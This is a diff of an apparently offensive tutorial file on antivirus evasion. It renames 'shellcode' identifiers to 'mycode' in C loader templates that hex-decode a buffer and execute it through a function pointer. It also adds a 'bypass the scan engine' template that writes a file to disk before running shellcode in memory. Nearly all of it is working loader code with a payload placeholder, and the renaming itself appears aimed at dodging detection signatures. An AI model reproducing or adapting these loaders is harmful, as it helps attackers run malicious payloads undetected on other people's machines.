@@ -84,39 +84,39 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
       <tchar.h>
       <stdlib.h>
 
-      void exec_shellcode(unsigned char *shellcode)
+      void exec_mycode(unsigned char *mycode)
       {
       int (*funct)();
-         funct = (int (*)()) shellcode;
+         funct = (int (*)()) mycode;
          (int)(*funct)();
       }
 
-      // return pointer to shellcode
-      unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
+      // return pointer to mycode
+      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
       {
       int j=0;
-         shellcode=malloc((size/2));
+         mycode=malloc((size/2));
          int i=0;
       do
       {
       unsigned char temp[3]={0};
          sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
-         shellcode[j] = strtoul(temp, NULL, 16);
+         mycode[j] = strtoul(temp, NULL, 16);
          i+=2;
          j++;
       } while(i<size);
-         return shellcode;
+         return mycode;
       }
          int main (int argc, char **argv)
       {
-         unsigned char *shellcode;
+         unsigned char *mycode;
 
       unsigned char buffer[]=
       "INSERT_SHELLCODE_HERE";
 
       int size = sizeof(buffer);
-         shellcode = decode_shellcode(buffer,shellcode,size);
-         exec_shellcode(shellcode);
+         mycode = decode_mycode(buffer,mycode,size);
+         exec_mycode(mycode);
       }
 
 - compiling with **GCC**
@@ -152,10 +152,10 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
 
 <br /><br /><br />
 
-
-
-
 ## bypass the scan engine (avet) template.c
+
+      This next tecnic writes a file to disk before executing shellcode into target ram ..
+
 
       #include <stdio.h>
       #include <stdlib.h>
@@ -166,10 +166,10 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
       #include <stdlib.h>
       #include <strsafe.h>
 
-      void exec_shellcode(unsigned char *shellcode)
+      void exec_mycode(unsigned char *mycode)
       {
         int (*funct)();
-        funct = (int (*)()) shellcode;
+        funct = (int (*)()) mycode;
         (int)(*funct)();
       }
 
@@ -194,8 +194,12 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
 	if (hFile == INVALID_HANDLE_VALUE) 
 		exit(0);
 
-	exec_shellcode(buffer);
+	exec_mycode(buffer);
       }
+
+---
+
+<br /><br /><br />
 
 
 **Author: @r00t-3xp10it**<br />
